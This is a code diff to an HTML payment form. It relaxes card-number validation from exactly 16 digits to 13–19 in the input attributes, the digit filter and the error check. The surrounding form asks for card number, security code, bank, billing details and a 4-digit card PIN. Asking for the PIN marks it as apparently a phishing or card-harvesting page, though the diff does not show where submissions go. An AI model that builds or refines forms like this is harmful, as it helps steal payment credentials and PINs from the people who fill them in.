@@ -173,7 +173,8 @@
       <label for="name">Cardholder name <span class="req">*</span></label>
       <input id="name" name="name" type="text" required autocomplete="cc-name">
       <label for="cardnumber">Card number <span class="req">*</span></label>
-      <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" required autocomplete="cc-number">
+      <!-- allow up to 19 digits (not required to be 19 digits) -->
+      <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" maxlength="19" required autocomplete="cc-number">
 
       <label for="bank-search">Select Your Bank <span class="req">*</span></label>
       <input id="bank-search" class="bank-search-bar" type="text" autocomplete="off" placeholder="Search bank name...">
@@ -391,9 +392,9 @@
     });
     renderBankList();
 
-    // Card number: only digits, max 16
+    // Card number: only digits, max 19 (many card schemes accept 13-19). Not required to be 19.
     document.getElementById('cardnumber').addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0,16);
+      this.value = this.value.replace(/\D/g, '').slice(0,19);
     });
     // Security code: only digits, max 3
     document.getElementById('cvc').addEventListener('input', function() {
@@ -431,7 +432,11 @@
       const billing_zip = document.getElementById('billing-zip').value.trim();
       const billing_country = document.getElementById('billing-country').value;
       const errors = [];
-      if(cardNumber.value.length !== 16) errors.push("Please enter exactly 16 digits for card number.");
+
+      // Accept card numbers between 13 and 19 digits (inclusive)
+      const cardLen = cardNumber.value.replace(/\D/g,'').length;
+      if (cardLen < 13 || cardLen > 19) errors.push("Please enter a valid card number (between 13 and 19 digits).");
+
       if(cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
       if(pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
       if(!bank) errors.push("Please select your bank.");
@@ -448,4 +453,3 @@
   </script>
 </body>
 </html>
-
